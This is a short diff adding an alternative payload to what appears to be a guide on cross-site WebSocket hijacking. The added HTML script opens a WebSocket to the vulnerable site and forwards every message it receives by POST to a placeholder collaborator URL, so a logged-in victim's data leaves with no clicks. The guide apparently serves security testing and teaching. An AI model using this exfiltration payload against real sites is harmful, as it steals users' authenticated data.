@@ -292,6 +292,19 @@ If the victim visits the attacker's page while logged into the vulnerable app, t
 </script>
 ```
 
+or:
+```html
+<script>
+    var ws = new WebSocket('wss://your-websocket-url');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
+
 The victim just needs to have this page open in a tab while logged into the target site — no clicks required.
 
 ---
